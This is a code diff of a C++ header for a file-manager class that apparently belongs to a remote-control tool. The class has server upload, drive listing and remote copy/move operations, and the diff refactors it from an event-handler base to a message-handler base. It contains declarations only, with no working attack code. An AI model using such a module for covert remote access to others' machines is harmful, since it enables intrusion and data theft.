@@ -1,5 +1,5 @@
 #pragma once
-#include "EventHandler.h"
+#include "MsgHandler.h"
 
 #define FILE_MANAGER	('F'|('M'<<8)|('G')<<16|('R'<<24))
 
@@ -39,9 +39,9 @@
 #define FILE_MGR_PREV_RENAME			0x1105
 
 class CModuleMgr;
-
+class CManager;
 class CFileManager:
-	public CEventHandler
+	public CMsgHandler
 {
 	typedef void (*pModuleEntry)(char* szServerAddr,unsigned short uPort,DWORD dwParam);
 private:
@@ -72,8 +72,6 @@ private:
 	wchar_t*	m_FileList;
 	DWORD		m_bMove;
 
-	CModuleMgr* m_pModuleMgr;
-
 	BOOL ChDir(const WCHAR* Dir);
 
 	void SendDriverList();
@@ -92,10 +90,11 @@ private:
 	void UploadToSrv();
 
 	void OnClose();	
-	void OnConnect();
+	void OnOpen();
 
-	void OnReadPartial(WORD Event, DWORD Total, DWORD Read, char*Buffer);
-	void OnReadComplete(WORD Event, DWORD Total, DWORD Read, char*Buffer);
+
+	void OnReadMsg(WORD Msg, DWORD dwSize, char*Buffer);
+	void OnWriteMsg(WORD Msg, DWORD dwSize, char*Buffer){}
 
 	static void FMCpOrMvFile(WCHAR*szFileName, BOOL bIsDir, DWORD dwParam);
 
@@ -117,7 +116,7 @@ public:
 	void OnCut(char*buffer);
 	void OnPaste(char*buffer);
 
-	CFileManager(CModuleMgr*pModuleMgr);
+	CFileManager(CManager*pManager);
 	~CFileManager();
 };
 
